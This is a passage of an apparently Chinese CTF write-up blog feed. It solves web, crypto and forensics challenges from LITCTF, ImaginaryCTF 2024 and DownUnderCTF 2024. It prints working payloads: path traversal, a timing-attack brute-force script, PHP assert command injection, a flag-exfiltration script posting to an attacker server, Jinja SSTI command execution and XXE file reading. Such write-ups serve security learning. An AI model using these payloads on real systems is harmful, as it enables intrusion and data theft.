class="hljs-keyword">const</span> indexFile = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(path.<span class="hljs-title function_">join</span>(absPath, <span class="hljs-string">&quot;index.html&quot;</span>), <span class="hljs-string">&quot;utf-8&quot;</span>);<br>      res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/html&quot;</span> &#125;);<br>      res.<span class="hljs-title function_">end</span>(indexFile);<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">404</span>, &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;text/plain&quot;</span> &#125;);<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;404 not found&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server started&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>没提示flag在哪<br>猜测在网站目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> http://litctf.org:<span class="hljs-number">31778</span>/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/app/flag.txt --output -<br><span class="hljs-attribute">LITCTF</span>&#123;backtr@ked_230fim0&#125;<br></code></pre></td></tr></table></figure><h3 id="kirbytime"><a href="#kirbytime" class="headerlink" title="kirbytime"></a>kirbytime</h3><p>源码</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sas">import sqlite3<br><span class="hljs-keyword">from</span> flask import Flask, request, <span class="hljs-keyword">redirect</span>, render_template<br>import time<br>app = Flask(__name__)<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def logi<span class="hljs-meta">n</span>():<br>    <span class="hljs-keyword">message</span> = None<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        real = <span class="hljs-string">&#x27;REDACTED&#x27;</span><br>        <span class="hljs-keyword">if</span> le<span class="hljs-meta">n</span>(password) != 7:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, <span class="hljs-keyword">message</span>=<span class="hljs-string">&quot;you need 7 chars&quot;</span>)<br>        for i <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(le<span class="hljs-meta">n</span>(password)):<br>            <span class="hljs-keyword">if</span> password[i] != real[i]:<br>                <span class="hljs-keyword">message</span> = <span class="hljs-string">&quot;incorrect&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, <span class="hljs-keyword">message</span>=<span class="hljs-keyword">message</span>)<br>            <span class="hljs-keyword">else</span>:<br>                time.sleep(1)<br>        <span class="hljs-keyword">if</span> password == real:<br>            <span class="hljs-keyword">message</span> = <span class="hljs-string">&quot;yayy! hi kirby&quot;</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, <span class="hljs-keyword">message</span>=<span class="hljs-keyword">message</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.ru<span class="hljs-meta">n</span>(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>if password[i] != real[i]逐个判断，如果正确会延时1s，利用这个特性来一个个爆出来正确密码<br>密码是固定的<br>靶机只有10分钟，多跑几遍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://34.31.154.223:56812/&#x27;</span>  <span class="hljs-comment"># 替换为你的 Flask 服务器 URL</span><br>charset = string.ascii_letters + string.digits  <span class="hljs-comment"># 字符集，包含大小写字母和数字</span><br>password_length = <span class="hljs-number">7</span>  <span class="hljs-comment"># 目标密码的长度</span><br><br>found_password = <span class="hljs-string">&quot;kBySlaY&quot;</span>   <span class="hljs-comment">#把跑出来正确的加到这里再跑一遍</span><br>i = <span class="hljs-number">6</span>    <span class="hljs-comment">#最开始为0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> charset:<br>        attempt_password = found_password + char + <span class="hljs-string">&quot;-&quot;</span> * (password_length - <span class="hljs-built_in">len</span>(found_password) - <span class="hljs-number">1</span>)<br>        <br>        start_time = time.time()<br>        response = requests.post(url, data=&#123;<span class="hljs-string">&#x27;password&#x27;</span>: attempt_password&#125;)<br>        elapsed_time = time.time() - start_time<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;尝试密码: <span class="hljs-subst">&#123;attempt_password&#125;</span>，响应时间: <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.4</span>f&#125;</span>秒&quot;</span>)<br><br>        <span class="hljs-comment"># 检查响应时间，超过一定阈值则表示该字符正确</span><br>        <span class="hljs-keyword">if</span> (elapsed_time &gt; (i + <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> elapsed_time &lt; (i+<span class="hljs-number">2</span>) ) :  <span class="hljs-comment"># 根据逐位延时情况进行调整</span><br>            found_password += char<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到了第 <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span> 位密码字符: <span class="hljs-subst">&#123;char&#125;</span> 响应时间: <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.4</span>f&#125;</span>秒&quot;</span>)<br>            i +=<span class="hljs-number">1</span><br>            time.sleep(<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终找到的密码是: <span class="hljs-subst">&#123;found_password&#125;</span>&quot;</span>)<br><span class="hljs-comment">#LITCTF&#123;kBySlaY&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>imaginaryctf 2024</title>
    <link href="/2024/07/22/imaginaryctf%202024/"/>
    <url>/2024/07/22/imaginaryctf%202024/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h3><p>附件dockerfile 直接给了flag<br><code>ictf&#123;path_normalization_to_the_rescue&#125;</code></p><h3 id="journal"><a href="#journal" class="headerlink" title="journal"></a>journal</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to my journal app!&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=/?file=file1.txt&gt;file1.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=/?file=file2.txt&gt;file2.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=/?file=file3.txt&gt;file3.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=/?file=file4.txt&gt;file4.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;a href=/?file=file5.txt&gt;file5.txt&lt;/a&gt;&lt;/p&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>  <span class="hljs-variable">$filepath</span> = <span class="hljs-string">&#x27;./files/&#x27;</span> . <span class="hljs-variable">$file</span>;<br><br>  <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid file!&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filepath</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filepath</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;File not found!&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>$file可控，可以利用assert 构造输入rce<br><code>?file=123&#39;,&#39;a&#39;)||system(&#39;tac /f*&#39;)||strpos(&#39;aa</code><br>则语句变成<br><code>assert(&quot;strpos(&#39;123&#39;,&#39;a&#39;)||system(&#39;tac /f*&#39;)||strpos(&#39;aa&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Invalid file!&quot;);</code><br>assert会分别执行<code>strpos(&#39;123&#39;,&#39;a&#39;)</code>，<code>system(&#39;tac /f*&#39;)</code>，<code>strpos(&#39;aa&#39;, &#39;..&#39;) === false</code>3部分获取返回值，并验证||运算后的结果是true还是false</p><h3 id="P2C"><a href="#P2C" class="headerlink" title="P2C"></a>P2C</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xec</span>(<span class="hljs-params">code</span>):<br>    code = code.strip()<br>    indented = <span class="hljs-string">&quot;\n&quot;</span>.join([<span class="hljs-string">&quot;    &quot;</span> + line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> code.strip().splitlines()])<br><br>    file = <span class="hljs-string">f&quot;/tmp/uploads/code_<span class="hljs-subst">&#123;md5(code.encode()).hexdigest()&#125;</span>.py&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-string">&quot;def main():\n&quot;</span>)<br>        f.write(indented)<br>        f.write(<span class="hljs-string">&quot;&quot;&quot;\nfrom parse import rgb_parse</span><br><span class="hljs-string">print(rgb_parse(main()))&quot;&quot;&quot;</span>)<br><br>    os.system(<span class="hljs-string">f&quot;chmod 755 <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        res = subprocess.run([<span class="hljs-string">&quot;sudo&quot;</span>, <span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;python3&quot;</span>, file], capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>, timeout=<span class="hljs-number">0.1</span>)<br>        output = res.stdout<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        output = <span class="hljs-literal">None</span><br><br>    os.remove(file)<br><br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>可以看到再执行完输入的code后才会<code>f.write(&quot;&quot;&quot;\nfrom parse import rgb_parse print(rgb_parse(main()))&quot;&quot;&quot;)</code>调用<code>rgb_parse</code>把结果转换为rgb<br>所以在转换之前可以先读取flag把flag发出去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> os<br>file_path = <span class="hljs-string">&#x27;flag.txt&#x27;</span><br>url = <span class="hljs-string">&#x27;ip:port&#x27;</span><br>param_name = <span class="hljs-string">&#x27;q&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    value = file.read().strip()<br>query_params = &#123;param_name: value&#125;<br>encoded_params = urllib.parse.urlencode(query_params)<br>full_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>?<span class="hljs-subst">&#123;encoded_params&#125;</span>&quot;</span><br>response = urllib.request.urlopen(full_url)<br></code></pre></td></tr></table></figure><p>服务器<code>python3 -m http.server 8888</code>开启http服务<br><img src="/mdimg/imaginaryctf2024/1721622189189-404111f4-a546-4bf0-9e29-a20a969b41f5.png"><br><code>ictf&#123;d1_color_picker_fr_2ce0dd3d&#125;</code></p><h3 id="crystals"><a href="#crystals" class="headerlink" title="crystals"></a>crystals</h3><p>打开就一个静态页面<br>看源码发现<br><img src="/mdimg/imaginaryctf2024/1721622189130-3315512f-625c-48bf-8b63-105732faed46.png"><br>把主机名设置为flag<br>通过触发不正常响应来获取主机名<br>触发404时发现一个路径<br><img src="/mdimg/imaginaryctf2024/1721622189264-6f6b01b7-619a-4c1b-bc99-2671309577c4.png"><br>访问 <code>/__sinatra__/404.png</code><br>可以读取文件响应码200<br>构造 <code>/__sinatra__/404.png|env</code> 触发400 Bad Request 返回了主机名<br><img src="/mdimg/imaginaryctf2024/1721622189222-a8f718a7-c7c0-484c-a4c5-b650fbb5d634.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>q = <span class="hljs-number">64</span><br><br>secret_key = [<span class="hljs-number">10</span>, <span class="hljs-number">52</span>, <span class="hljs-number">23</span>, <span class="hljs-number">14</span>, <span class="hljs-number">52</span>, <span class="hljs-number">16</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">37</span>, <span class="hljs-number">37</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">50</span>, <span class="hljs-number">32</span>, <span class="hljs-number">19</span>, <span class="hljs-number">14</span>, <span class="hljs-number">48</span>, <span class="hljs-number">32</span>, <span class="hljs-number">35</span>, <span class="hljs-number">13</span>, <span class="hljs-number">54</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">12</span>, <span class="hljs-number">31</span>, <span class="hljs-number">29</span>, <span class="hljs-number">7</span>, <span class="hljs-number">29</span>, <span class="hljs-number">38</span>, <span class="hljs-number">61</span>, <span class="hljs-number">37</span>, <span class="hljs-number">27</span>, <span class="hljs-number">47</span>, <span class="hljs-number">5</span>, <span class="hljs-number">51</span>, <span class="hljs-number">28</span>, <span class="hljs-number">50</span>, <span class="hljs-number">13</span>, <span class="hljs-number">35</span>, <span class="hljs-number">29</span>, <span class="hljs-number">46</span>, <span class="hljs-number">1</span>, <span class="hljs-number">51</span>, <span class="hljs-number">24</span>, <span class="hljs-number">31</span>, <span class="hljs-number">21</span>, <span class="hljs-number">54</span>, <span class="hljs-number">28</span>, <span class="hljs-number">52</span>, <span class="hljs-number">8</span>, <span class="hljs-number">54</span>, <span class="hljs-number">30</span>, <span class="hljs-number">38</span>, <span class="hljs-number">17</span>, <span class="hljs-number">55</span>, <span class="hljs-number">24</span>, <span class="hljs-number">41</span>, <span class="hljs-number">1</span>]<br><br>flag_int = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(secret_key):<br>    flag_int = flag_int * q + value<br><br>flag = long_to_bytes(flag_int)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br><span class="hljs-comment">#ictf&#123;b4se_c0nv3rs1on_ftw_236680982d9e8449&#125;</span><br></code></pre></td></tr></table></figure><h2 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2><h3 id="bom"><a href="#bom" class="headerlink" title="bom"></a>bom</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_bom_and_read</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        bom = f.read(<span class="hljs-number">4</span>)  <span class="hljs-comment"># 读取前四个字节以检查 BOM</span><br>        f.seek(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 将文件指针移动回开始位置</span><br>        content = f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)  <span class="hljs-comment"># 尝试使用 UTF-8 解码</span><br><br>    <span class="hljs-comment"># 打印 BOM</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Detected BOM: <span class="hljs-subst">&#123;bom&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 判断 BOM 并调整内容</span><br>    <span class="hljs-keyword">if</span> bom.startswith(<span class="hljs-string">b&#x27;\xef\xbb\xbf&#x27;</span>):  <span class="hljs-comment"># UTF-8 BOM</span><br>        content = content[<span class="hljs-number">3</span>:]<br>    <span class="hljs-keyword">elif</span> bom.startswith(<span class="hljs-string">b&#x27;\xff\xfe&#x27;</span>):  <span class="hljs-comment"># UTF-16 BOM</span><br>        content = content[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">elif</span> bom.startswith(<span class="hljs-string">b&#x27;\x00\x00\xfe\xff&#x27;</span>):  <span class="hljs-comment"># UTF-32 BOM</span><br>        content = content[<span class="hljs-number">4</span>:]<br><br>    <span class="hljs-keyword">return</span> content<br><br>filename = <span class="hljs-string">&#x27;chal.txt&#x27;</span><br>content = remove_bom_and_read(filename)<br><span class="hljs-built_in">print</span>(content)<br><span class="hljs-comment">###</span><br>Detected BOM: <span class="hljs-string">b&#x27;\xfe\xffic&#x27;</span><br>ictf&#123;th4t_isn7_chin3se&#125;<br><span class="hljs-comment">###</span><br><br></code></pre></td></tr></table></figure><h3 id="packed"><a href="#packed" class="headerlink" title="packed"></a>packed</h3><p>改后缀为zip<br><img src="/mdimg/imaginaryctf2024/1721622430620-b795baf7-ee3f-4960-bec0-fd95a55636df.png"><br><code>ictf&#123;ab4697882634d4aeb6f21141ea2724d0&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DownUnderCTF 2024 web</title>
    <link href="/2024/07/08/DownUnderCTF%202024%20web/"/>
    <url>/2024/07/08/DownUnderCTF%202024%20web/</url>
    
    <content type="html"><![CDATA[<h2 id="parrot-the-emu"><a href="#parrot-the-emu" class="headerlink" title="parrot the emu"></a>parrot the emu</h2><p>jinja ssti</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/DownUnderCTF2024/1720430441419-89211ef9-5c41-4e22-8205-c09a6064672b.png"></p><h2 id="zoo-feedback-form"><a href="#zoo-feedback-form" class="headerlink" title="zoo feedback form"></a>zoo feedback form</h2><p>xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">flag</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///app/flag.txt&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">feedback</span>&gt;</span><span class="hljs-symbol">&amp;flag;</span><span class="hljs-tag">&lt;/<span class="hljs-name">feedback</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/DownUnderCTF2024/1720430794300-6063deea-132b-4fef-aa57-08e06b257303.png"></p><h2 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h2><p>python原型链污染<br>参考<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">https://www.cnblogs.com/Article-kelp/p/17068716.html</a><br>审计源码<br>在routes.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/save_feedback&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_feedback</span>():<br>    data = json.loads(request.data)<br>    feedback = Feedback()<br>    <span class="hljs-comment"># Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.</span><br>    merge(data, feedback)<br>    save_feedback_to_disk(feedback)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>&#125;), <span class="hljs-number">200</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/get_flag&quot;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;true&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DUCTF&#123;NOT_THE_REAL_FLAG&#125;&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/update_user_data&quot;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_data</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Coming Soon...&quot;</span><br></code></pre></td></tr></table></figure><p>flag == true 得到flag<br>看<code>/save_feedback</code>路由的<code>merge</code>方法<br><img src="/mdimg/DownUnderCTF2024/1720431387833-78fe524d-2684-4509-bb7b-1cc40ed96f0a.png"><br>可以通过merge来将flag的属性污染为true</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span 